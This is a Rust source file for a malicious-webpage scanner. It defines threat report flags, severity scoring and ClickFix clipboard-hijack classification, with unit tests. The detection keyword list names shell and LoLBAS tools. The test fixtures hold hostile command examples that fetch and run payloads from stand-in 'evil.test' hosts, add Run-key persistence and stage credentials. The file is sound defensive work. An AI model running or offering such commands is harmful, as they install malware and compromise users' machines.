use chrono::Utc;
use serde::{Deserialize, Serialize};

use crate::html::Framework;
use crate::tech::TechDetection;

// ── Flag types ────────────────────────────────────────────────────────────────

/// Untagged so newtype variants serialise cleanly (e.g. `"BlockedElement"` key).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum HtmlFlag {
    BlockedElement(String),
    BlockedAttribute {
        element: String,
        attr: String,
        value: String,
    },
    SuspiciousMeta {
        kind: String,
    },
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CodeLocation {
    pub source: String,
    pub line: u32,
    pub col: u32,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct NetworkCall {
    pub kind: String,
    pub url: String,
    pub loc: CodeLocation,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DomMutation {
    pub sink: String,
    pub loc: CodeLocation,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DecodedString {
    pub method: String,
    pub original: String,
    pub decoded: String,
    pub loc: CodeLocation,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum JsFlag {
    EvalCall(CodeLocation),
    EvalLiteralArg { value: String, loc: CodeLocation },
    FunctionConstructor { loc: CodeLocation, arg: Option<String>, snippet: Option<String> },
    DocumentWrite(CodeLocation),
    DangerousSink(DomMutation),
    NetworkCall(NetworkCall),
    RedirectAttempt(String),
    WebSocketAttempt(String),
    CookieWrite(CodeLocation),
    PostMessage(CodeLocation),
    Base64Obfuscation(DecodedString),
    HexObfuscation(DecodedString),
    TimerWithString { timer: String, code: String, loc: CodeLocation },
    /// Script is probing for headless/automated browser environment.
    /// Technique values: `webdriver_check`, `headless_string_probe`,
    /// `screen_dimension_probe`, `plugins_probe`.
    SandboxEvasion { technique: String, detail: String, loc: CodeLocation },
    /// Fake-CAPTCHA / ClickFix clipboard hijack: JS wrote a string to the
    /// system clipboard via `navigator.clipboard.writeText` or a `copy`
    /// event handler with `clipboardData.setData`.
    /// `method` is one of `"navigator.clipboard.writeText"` or `"copy_event"`.
    ClipboardWrite { method: String, payload: String },
    /// Tier-3: the script is heavily obfuscated by a recognised obfuscator but
    /// neither static folding nor sandbox execution recovered a payload — the
    /// obfuscation itself resists analysis. `family` names the obfuscator.
    /// (Large-JS deobfuscation — Phase 4)
    UnresolvedObfuscation { family: String, detail: String },
    /// A crypto-wallet RPC method string (`eth_sendTransaction`, `personal_sign`,
    /// …) appears in the script — the core action of a Web3 wallet drainer. Strong
    /// signal once it surfaces in deobfuscated code. (Large-JS deobfuscation — Phase 4)
    CryptoWalletApi { method: String },
    /// EtherHiding: a read-only on-chain payload fetch (`eth_call` JSON-RPC) with
    /// no user wallet — the ClearFake stage-2 retrieval technique. Surfaced here
    /// when it appears in (re-analysed, deobfuscated, or rendered) script so it
    /// participates in the ClearFake context-collapse rule. (ClearFake — G4)
    EtherHidingRead,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Flag {
    pub severity: Severity,
    pub code: String,
    pub detail: String,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum Severity {
    Low,
    Medium,
    High,
    Critical,
}

// ── ThreatReport ──────────────────────────────────────────────────────────────

/// One payload recovered by Tier-2 dynamic deobfuscation (sandbox sink-capture).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DecodedPayload {
    /// Source script the payload was recovered from, e.g. `inline[0]`.
    pub source_name: String,
    /// Sink that yielded it (`eval`, `Function`, `document.write`, `atob`, …).
    pub sink: String,
    /// Recursion layer (1 = first pass).
    pub layer: usize,
    /// The recovered code/string (capped for transport).
    pub code: String,
}

/// One script after Tier-0 static deobfuscation (constant folding).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct NormalizedScript {
    /// Logical name of the script, e.g. `inline[0]` or the external URL.
    pub name: String,
    /// SHA-256 (hex) of the ORIGINAL source — lets the consumer dedup/cache.
    pub sha256: String,
    /// Number of constant expressions folded.
    pub fold_count: usize,
    /// The folded source (capped for transport).
    pub normalized: String,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct ThreatReport {
    pub url: String,
    pub timestamp: String,
    /// Primary JS/meta framework (backward-compat field; prefer `tech_stack`).
    pub framework_detected: Option<String>,
    /// Full technology stack detected by the browser-grade DOM analyser.
    pub tech_stack: Vec<TechDetection>,
    pub risk_score: u8,
    /// Set to true when the full render pipeline was skipped (LJS-05: non-HTML
    /// content-type detected — JS analyser ran directly on the raw body).
    #[serde(default)]
    pub render_skipped: bool,

    /// Set to true when the delivered screenshot is visually blank (effectively
    /// all near-white pixels) after the in-process retry ladder was exhausted.
    /// Lets the caller discard a white PNG that would otherwise pass a byte-size
    /// check, and lets scoring treat the visual as unreliable. (CARAPACE-09 / P1)
    #[serde(default)]
    pub render_blank: bool,

    /// Fraction of near-white pixels (0.0–1.0) in the delivered desktop
    /// screenshot — the measurement behind `render_blank`, surfaced for tuning.
    #[serde(default)]
    pub blank_ratio: f32,

    /// Which render strategy produced the delivered screenshot:
    /// `"live"` (navigated the real URL through the same-origin policy proxy),
    /// `"offline_fallback"` (live failed/blank → offline self-contained render),
    /// or `"offline"` (live disabled). Surfaced for analyst visibility and tuning.
    /// (CARAPACE-09 / P0)
    #[serde(default)]
    pub render_mode: String,

    /// The post-JS DOM of the live render (when live mode succeeded), capped for
    /// transport. Lets the caller run the full HTML/JS analysers on what the browser
    /// actually rendered — essential for content hidden behind a service-worker
    /// gateway (IPFS dweb.link) or fully JS-rendered SPAs, which the HTTP fetcher
    /// only sees as a bootstrap shell. Empty when not available. (CARAPACE-09 / P0-c)
    #[serde(default)]
    pub rendered_html: String,

    /// Tier-0 deobfuscation output: per-script source with constants folded
    /// (string concat, fromCharCode, atob-literal, literal-array index). Only
    /// scripts that actually folded something are included. Lets the Python
    /// engine run its signature library on the resolved payload rather than the
    /// obfuscated original. (Large-JS deobfuscation — Phase 1 / Tier-0)
    #[serde(default)]
    pub normalized_scripts: Vec<NormalizedScript>,

    /// Tier-2 deobfuscation output: payloads the sandbox captured from
    /// eval/Function/document.write/decode sinks while the script's own decoder
    /// ran — the cleartext behind dynamic obfuscation. (Large-JS deobfuscation —
    /// Phase 2 / Tier-2)
    #[serde(default)]
    pub decoded_payloads: Vec<DecodedPayload>,

    html_flags: Vec<HtmlFlag>,
    js_flags: Vec<JsFlag>,
    blocked_network: Vec<String>,

    pub flags: Vec<Flag>,
}

impl ThreatReport {
    pub fn new(url: &str) -> Self {
        Self {
            url: url.to_string(),
            timestamp: Utc::now().to_rfc3339(),
            framework_detected: None,
            tech_stack: Vec::new(),
            risk_score: 0,
            render_skipped: false,
            render_blank: false,
            blank_ratio: 0.0,
            render_mode: String::new(),
            rendered_html: String::new(),
            normalized_scripts: Vec::new(),
            decoded_payloads: Vec::new(),
            html_flags: Vec::new(),
            js_flags: Vec::new(),
            blocked_network: Vec::new(),
            flags: Vec::new(),
        }
    }

    /// Merge flags from `other` into `self`, deduplicating by flag code.
    /// Used by the overlapping-chunk analysis in the `/analyse` endpoint (LJS-08)
    /// to combine findings from multiple chunk reports into one.
    pub fn merge_flags(&mut self, other: ThreatReport) {
        for flag in other.flags {
            if !self.flags.iter().any(|f| f.code == flag.code) {
                self.flags.push(flag);
            }
        }
        self.recalculate_score();
    }

    pub fn set_framework(&mut self, framework: &Framework) {
        self.framework_detected = match framework {
            Framework::Unknown => None,
            other => Some(format!("{:?}", other)),
        };
    }

    /// Replace the tech stack with the results from the comprehensive detector.
    /// Also keeps `framework_detected` in sync with the primary JS/meta framework.
    pub fn set_tech_stack(&mut self, stack: Vec<TechDetection>) {
        // Derive framework_detected from the first JS/meta framework in the stack
        // so the backward-compat field stays accurate.
        let primary = stack.iter().find(|t| {
            t.category == "JavaScript Framework" || t.category == "Meta Framework"
        });
        if let Some(t) = primary {
            self.framework_detected = Some(t.name.clone());
        }
        self.tech_stack = stack;
    }

    pub fn add_html_flag(&mut self, flag: HtmlFlag) {
        match &flag {
            HtmlFlag::BlockedElement(tag) if tag == "script" => {
                self.push_flag(Severity::High, "BLOCKED_ELEMENT_SCRIPT", "<script> tag removed".into());
            }
            HtmlFlag::BlockedElement(tag) if tag == "iframe" => {
                self.push_flag(Severity::Medium, "BLOCKED_ELEMENT_IFRAME", "<iframe> tag removed".into());
            }
            HtmlFlag::BlockedElement(tag) => {
                self.push_flag(Severity::Low, "BLOCKED_ELEMENT_OTHER", format!("<{}> tag removed", tag));
            }
            HtmlFlag::BlockedAttribute { element, attr, value } => {
                if attr.starts_with("on") {
                    // <link onload="..."> is the standard async CSS loading idiom
                    // (this.onload=null;this.rel='stylesheet') — not a script execution vector.
                    if element == "link" && attr == "onload" {
                        // still record in html_flags for audit trail, but don't push a finding
                    } else {
                        // Auto-firing handlers (onload, onerror, onbeforeunload) execute
                        // without any user interaction — HIGH. User-interaction handlers
                        // (onclick, onmouseover, etc.) require the visitor to act — MEDIUM.
                        let auto_firing = matches!(
                            attr.as_str(),
                            "onload" | "onerror" | "onbeforeunload" | "onunload"
                                | "onfocusin" | "onpageshow" | "onpagehide"
                                | "onreadystatechange" | "onanimationend"
                        );
                        let severity = if auto_firing { Severity::High } else { Severity::Medium };
                        self.push_flag(
                            severity,
                            "EVENT_HANDLER_STRIPPED",
                            format!("{}={:?} on <{}>", attr, value, element),
                        );
                    }
                } else {
                    self.push_flag(
                        Severity::Medium,
                        "JAVASCRIPT_URL_STRIPPED",
                        format!("{}={:?} on <{}>", attr, value, element),
                    );
                }
            }
            HtmlFlag::SuspiciousMeta { kind } => {
                self.push_flag(Severity::Medium, "META_REDIRECT_STRIPPED", format!("meta {}", kind));
            }
        }
        self.html_flags.push(flag);
        self.recalculate_score();
    }

    pub fn add_js_flag(&mut self, flag: JsFlag) {
        match &flag {
            JsFlag::EvalCall(_) => {
                self.push_flag(Severity::Critical, "JS_EVAL_DETECTED", "eval() call".into());
            }
            JsFlag::FunctionConstructor { arg, snippet, .. } => {
                match arg {
                    Some(body) => {
                        // Literal body — analyst has the evidence to assess intent.
                        let s = &body[..body.len().min(120)];
                        self.push_flag(
                            Severity::High,
                            "JS_FUNCTION_CONSTRUCTOR",
                            format!("new Function({:?})", s),
                        );
                    }
                    None => {
                        // Dynamic/non-literal body — show the raw source snippet so the
                        // analyst can see the variable name and call site.
                        let detail = snippet.as_deref()
                            .unwrap_or("new Function(<dynamic expression>)")
                            .to_string();
                        self.push_flag(
                            Severity::Medium,
                            "JS_FUNCTION_CONSTRUCTOR_DYNAMIC",
                            detail,
                        );
                    }
                }
            }
            JsFlag::Base64Obfuscation(d) => {
                let orig = &d.original[..d.original.len().min(40)];
                let dec = &d.decoded[..d.decoded.len().min(40)];
                self.push_flag(Severity::High, "BASE64_OBFUSCATION", format!("atob('{}') → '{}'", orig, dec));
            }
            JsFlag::HexObfuscation(_) => {
                self.push_flag(Severity::High, "HEX_OBFUSCATION", "hex-escape obfuscated string".into());
            }
            JsFlag::NetworkCall(n) => {
                self.push_flag(Severity::Medium, "NETWORK_ATTEMPT_BLOCKED", format!("{} → {}", n.kind, n.url));
            }
            JsFlag::WebSocketAttempt(url) => {
                self.push_flag(Severity::High, "WEBSOCKET_ATTEMPT", format!("WebSocket → {}", url));
            }
            JsFlag::RedirectAttempt(url) => {
                self.push_flag(Severity::Medium, "REDIRECT_ATTEMPT", format!("→ {}", url));
            }
            JsFlag::DangerousSink(m) => {
                self.push_flag(Severity::Medium, "INNER_HTML_MUTATION", format!("{} sink", m.sink));
            }
            JsFlag::DocumentWrite(_) => {
                self.push_flag(Severity::Medium, "DOCUMENT_WRITE", "document.write()".into());
            }
            JsFlag::CookieWrite(_) => {
                self.push_flag(Severity::Medium, "COOKIE_ACCESS", "document.cookie write".into());
            }
            JsFlag::TimerWithString { timer, code, .. } => {
                let snippet = &code[..code.len().min(60)];
                self.push_flag(Severity::High, "TIMER_STRING_EXEC", format!("{}(string) → {:?}", timer, snippet));
            }
            JsFlag::SandboxEvasion { technique, detail, .. } => {
                let (severity, code) = match technique.as_str() {
                    "webdriver_check"            => (Severity::High,   "SANDBOX_EVASION_WEBDRIVER"),
                    "headless_string_probe"      => (Severity::High,   "SANDBOX_EVASION_HEADLESS_STRING"),
                    "screen_dimension_probe"     => (Severity::Medium, "SANDBOX_EVASION_SCREEN_PROBE"),
                    "plugins_probe"              => (Severity::Low,    "SANDBOX_EVASION_PLUGINS_PROBE"),
                    "chrome_runtime_probe"       => (Severity::High,   "SANDBOX_EVASION_CHROME_RUNTIME"),
                    "focus_probe"                => (Severity::High,   "SANDBOX_EVASION_FOCUS_PROBE"),
                    "canvas_fingerprint_probe"   => (Severity::High,   "SANDBOX_EVASION_CANVAS_FINGERPRINT"),
                    "languages_probe"            => (Severity::Medium, "SANDBOX_EVASION_LANGUAGES"),
                    "notification_probe"         => (Severity::High,   "SANDBOX_EVASION_NOTIFICATION"),
                    "hardware_fingerprint_probe" => (Severity::High,   "SANDBOX_EVASION_HARDWARE_FINGERPRINT"),
                    _                            => (Severity::Medium,  "SANDBOX_EVASION"),
                };
                self.push_flag(severity, code, detail.clone());
            }
            JsFlag::ClipboardWrite { method, payload } => {
                let lower = payload.to_ascii_lowercase();
                // Keep this keyword class in sync with the Python analyser's _SHELL_CMD_RE
                // in backend/scanner/modules/js_analyser.py (both layers must agree on what
                // counts as a ClickFix shell payload). "invoke-" covers invoke-expression /
                // invoke-restmethod / invoke-webrequest; " iex" / "irm " catch the aliases.
                let is_clickfix = [
                    "curl ", "powershell", " iex", "irm ", "cmd.exe", "/bin/bash", "bash -c",
                    "wget ", "python ", "invoke-", "rundll32", "mshta", "certutil",
                    "regsvr32", "wscript", "cscript", "base64 -d",
                    // LoLBAS / DNS-staging and CrashFix (KongTuke, Jan 2026) additions:
                    "msiexec", "nslookup", "reg add", "taskkill", "cmdkey", "net use",
                    // Additional LoLBAS download/exec proxies — FileFix/CrashFix/DNS variants (2026)
                    "bitsadmin", "forfiles", "conhost", "mavinject", "ftp -s",
                ]
                .iter()
                .any(|kw| lower.contains(kw));
                let (severity, code) = if is_clickfix {
                    (Severity::Critical, "CLIPBOARD_HIJACK_CLICKFIX")
                } else {
                    (Severity::High, "CLIPBOARD_HIJACK")
                };
                let snippet = &payload[..payload.len().min(200)];
                self.push_flag(severity, code, format!("{} → {:?}", method, snippet));
            }
            JsFlag::UnresolvedObfuscation { detail, .. } => {
                self.push_flag(Severity::Medium, "OBFUSCATION_UNRESOLVED", detail.clone());
            }
            JsFlag::CryptoWalletApi { method } => {
                self.push_flag(Severity::High, "CRYPTO_WALLET_API",
                    format!("wallet RPC method: {}", method));
            }
            JsFlag::EtherHidingRead => {
                self.push_flag(Severity::Medium, "ETHERHIDING_ONCHAIN_READ",
                    "eth_call on-chain read with no wallet (ClearFake EtherHiding)".into());
            }
            _ => {}
        }
        self.js_flags.push(flag);
        self.recalculate_score();
    }

    pub fn add_blocked_network(&mut self, url: String) {
        self.blocked_network.push(url);
    }

    /// Record a Tier-0 deobfuscation result. Bounded so a page full of scripts
    /// cannot bloat the transported report.
    pub fn add_normalized_script(&mut self, script: NormalizedScript) {
        const MAX_NORMALIZED_SCRIPTS: usize = 25;
        if self.normalized_scripts.len() < MAX_NORMALIZED_SCRIPTS {
            self.normalized_scripts.push(script);
        }
    }

    /// Record a Tier-2 decoded payload. Bounded for transport.
    pub fn add_decoded_payload(&mut self, payload: DecodedPayload) {
        const MAX_DECODED_PAYLOADS: usize = 40;
        if self.decoded_payloads.len() < MAX_DECODED_PAYLOADS {
            self.decoded_payloads.push(payload);
        }
    }

    /// Record a fullscreen CSS overlay — the structural signature of ClickFix
    /// and SocGholish injections.  The `detail` string should include the
    /// relevant CSS properties as a readable snippet for the evidence block.
    pub fn add_css_overlay(&mut self, detail: &str) {
        self.push_flag(
            Severity::High,
            "CSS_OVERLAY_INJECTED",
            detail.to_string(),
        );
        self.recalculate_score();
    }

    /// Record QR code(s) decoded from page imagery whose payload is a URL.
    /// Quishing (QR phishing) hides the malicious link inside an image to defeat
    /// text/URL scanners. LOW in Rust — the Python layer escalates to MEDIUM when
    /// the decoded URL points to an external (non-known-good) domain, and context
    /// collapse raises it further on a brand-impersonating page.
    pub fn add_qr_code_url(&mut self, detail: &str) {
        self.push_flag(Severity::Low, "QR_CODE_URL", detail.to_string());
        self.recalculate_score();
    }

    /// Record a Browser-in-the-Browser (BitB) fake credential window: a brand
    /// login URL rendered as page text inside fake browser-window chrome over a
    /// credential capture, on a non-official domain.  The victim "verifies" an
    /// attacker-controlled URL string, not the real address bar.  CRITICAL — no
    /// legitimate page renders another brand's login URL inside a fake window
    /// frame above a password field.
    pub fn add_bitb_fake_window(&mut self, detail: &str) {
        self.push_flag(
            Severity::Critical,
            "BITB_FAKE_WINDOW",
            detail.to_string(),
        );
        self.recalculate_score();
    }

    /// Record URLs that JavaScript attempted to fetch at runtime (intercepted
    /// by the logging proxy and rejected).  A single finding is emitted with
    /// all unique domains listed in the evidence block.
    pub fn add_intercepted_requests(&mut self, urls: &[String]) {
        if urls.is_empty() {
            return;
        }
        for url in urls {
            self.blocked_network.push(url.clone());
        }
        let detail = urls
            .iter()
            .take(20)
            .map(|u| format!("  {}", u))
            .collect::<Vec<_>>()
            .join("\n");
        let detail = if urls.len() > 20 {
            format!("{}\n  … and {} more", detail, urls.len() - 20)
        } else {
            detail
        };
        // Bypass push_flag deduplication so we always record the URL list.
        if !self.flags.iter().any(|f| f.code == "INTERCEPTED_REQUEST") {
            self.flags.push(Flag {
                severity: Severity::Medium,
                code: "INTERCEPTED_REQUEST".to_string(),
                detail,
            });
            self.recalculate_score();
        }
    }

    /// Record a drive-by download attempt.
    ///
    /// The file body is **never written to disk** — only its SHA256 is stored.
    /// Severity is Critical because auto-downloads are the primary malware
    /// delivery vector.
    pub fn add_drive_by_download(
        &mut self,
        filename: &str,
        sha256: &str,
        content_type: &str,
        size_bytes: u64,
    ) {
        self.push_flag(
            Severity::Critical,
            "DRIVE_BY_DOWNLOAD",
            format!(
                "auto-download blocked: {:?} ({}) {} bytes — SHA256: {}",
                filename, content_type, size_bytes, sha256
            ),
        );
        self.recalculate_score();
    }

    /// Returns `true` when a flag with the given code has already been recorded.
    /// Used by post-render checks to correlate with earlier static-analysis findings.
    pub fn has_flag_code(&self, code: &str) -> bool {
        self.flags.iter().any(|f| f.code == code)
    }

    /// Record a JavaScript-injected viewport-spanning overlay — the runtime delivery
    /// mechanism for ClickFix, SocGholish, and ClearFake.
    ///
    /// `has_clipboard_write`: when true the ClickFix chain is complete (overlay + clipboard
    /// pre-loaded with a shell command) and severity is escalated to CRITICAL.
    pub fn add_dynamic_overlay_injected(&mut self, evidence: &str, has_clipboard_write: bool) {
        let (severity, code) = if has_clipboard_write {
            (Severity::Critical, "DYNAMIC_OVERLAY_INJECTED_CLICKFIX")
        } else {
            (Severity::High, "DYNAMIC_OVERLAY_INJECTED")
        };
        self.push_flag(severity, code, evidence.to_string());
        self.recalculate_score();
    }

    pub fn html_flags(&self) -> &[HtmlFlag] {
        &self.html_flags
    }

    pub fn js_flags(&self) -> &[JsFlag] {
        &self.js_flags
    }

    fn recalculate_score(&mut self) {
        // Base score: one point per unique code at its severity weight.
        let base: u32 = self
            .flags
            .iter()
            .map(|f| match f.severity {
                Severity::Critical => 40,
                Severity::High => 20,
                Severity::Medium => 10,
                Severity::Low => 5,
            })
            .sum();

        // Volume bonus: for each code that appears more than once in html_flags
        // or js_flags, add 2 pts per extra occurrence, capped at 10 per code.
        let mut code_counts: std::collections::HashMap<&str, u32> =
            std::collections::HashMap::new();
        for f in &self.html_flags {
            let code = match f {
                HtmlFlag::BlockedElement(t) if t == "script" => "BLOCKED_ELEMENT_SCRIPT",
                HtmlFlag::BlockedElement(t) if t == "iframe" => "BLOCKED_ELEMENT_IFRAME",
                HtmlFlag::BlockedElement(_) => "BLOCKED_ELEMENT_OTHER",
                HtmlFlag::BlockedAttribute { attr, .. } if attr.starts_with("on") => {
                    "EVENT_HANDLER_STRIPPED"
                }
                HtmlFlag::BlockedAttribute { .. } => "JAVASCRIPT_URL_STRIPPED",
                HtmlFlag::SuspiciousMeta { .. } => "META_REDIRECT_STRIPPED",
            };
            *code_counts.entry(code).or_default() += 1;
        }
        for f in &self.js_flags {
            let code = match f {
                JsFlag::EvalCall(_) => "JS_EVAL_DETECTED",
                JsFlag::FunctionConstructor { arg, .. } => {
                    if arg.is_some() { "JS_FUNCTION_CONSTRUCTOR" } else { "JS_FUNCTION_CONSTRUCTOR_DYNAMIC" }
                }
                JsFlag::Base64Obfuscation(_) => "BASE64_OBFUSCATION",
                JsFlag::HexObfuscation(_) => "HEX_OBFUSCATION",
                JsFlag::NetworkCall(_) => "NETWORK_ATTEMPT_BLOCKED",
                JsFlag::WebSocketAttempt(_) => "WEBSOCKET_ATTEMPT",
                JsFlag::RedirectAttempt(_) => "REDIRECT_ATTEMPT",
                JsFlag::DangerousSink(_) => "INNER_HTML_MUTATION",
                JsFlag::DocumentWrite(_) => "DOCUMENT_WRITE",
                JsFlag::CookieWrite(_) => "COOKIE_ACCESS",
                JsFlag::TimerWithString { .. } => "TIMER_STRING_EXEC",
                JsFlag::SandboxEvasion { technique, .. } => match technique.as_str() {
                    "webdriver_check"            => "SANDBOX_EVASION_WEBDRIVER",
                    "headless_string_probe"      => "SANDBOX_EVASION_HEADLESS_STRING",
                    "screen_dimension_probe"     => "SANDBOX_EVASION_SCREEN_PROBE",
                    "plugins_probe"              => "SANDBOX_EVASION_PLUGINS_PROBE",
                    "chrome_runtime_probe"       => "SANDBOX_EVASION_CHROME_RUNTIME",
                    "focus_probe"                => "SANDBOX_EVASION_FOCUS_PROBE",
                    "canvas_fingerprint_probe"   => "SANDBOX_EVASION_CANVAS_FINGERPRINT",
                    "languages_probe"            => "SANDBOX_EVASION_LANGUAGES",
                    "notification_probe"         => "SANDBOX_EVASION_NOTIFICATION",
                    "hardware_fingerprint_probe" => "SANDBOX_EVASION_HARDWARE_FINGERPRINT",
                    _                            => "SANDBOX_EVASION",
                },
                JsFlag::ClipboardWrite { .. } => continue,
                _ => continue,
            };
            *code_counts.entry(code).or_default() += 1;
        }
        let volume_bonus: u32 = code_counts
            .values()
            .map(|&n| if n > 1 { ((n - 1) * 2).min(10) } else { 0 })
            .sum();

        self.risk_score = (base + volume_bonus).min(100) as u8;
    }

    fn push_flag(&mut self, severity: Severity, code: &str, detail: String) {
        // Always deduplicate by code — only the first occurrence is recorded.
        if !self.flags.iter().any(|f| f.code == code) {
            self.flags.push(Flag { severity, code: code.to_string(), detail });
        }
    }

    pub fn to_json(&self) -> crate::error::Result<String> {
        Ok(serde_json::to_string_pretty(self)?)
    }
}

#[cfg(test)]
mod clickfix_classification_tests {
    use super::*;

    fn classify(payload: &str) -> String {
        let mut report = ThreatReport::new("https://example.test/");
        report.add_js_flag(JsFlag::ClipboardWrite {
            method: "navigator.clipboard.writeText".into(),
            payload: payload.into(),
        });
        report
            .flags
            .iter()
            .find(|f| f.code.starts_with("CLIPBOARD_HIJACK"))
            .map(|f| f.code.clone())
            .unwrap_or_default()
    }

    #[test]
    fn crashfix_and_lolbas_payloads_escalate_to_clickfix() {
        // Keep parity with the Python _SHELL_CMD_RE keyword class.
        for payload in [
            "cmdkey /add:host /user:u /pass:p",            // CrashFix SMB cred staging
            r"net use \\1.2.3.4\share",                    // SMB UNC mapping
            "msiexec /i https://evil.test/p.msi /qn",      // LoLBAS installer
            "nslookup -type=txt c2.evil.test",             // DNS staging
            "reg add HKCU\\...\\Run /v x /d evil",          // persistence
            "taskkill /f /im chrome.exe",                  // Chrome-restart step
            "irm https://evil.test/s.ps1 | iex",            // irm alias
            "powershell -enc ABC",                          // baseline still classified
        ] {
            assert_eq!(
                classify(payload),
                "CLIPBOARD_HIJACK_CLICKFIX",
                "expected ClickFix classification for payload: {payload:?}",
            );
        }
    }

    #[test]
    fn benign_clipboard_write_stays_high_not_clickfix() {
        for payload in [
            "SUMMER25",                                    // discount code
            "https://example.test/share/abc",              // share link
            "Hello, thanks for copying this text!",        // plain text
        ] {
            assert_eq!(
                classify(payload),
                "CLIPBOARD_HIJACK",
                "benign clipboard write must not be classified ClickFix: {payload:?}",
            );
        }
    }
}
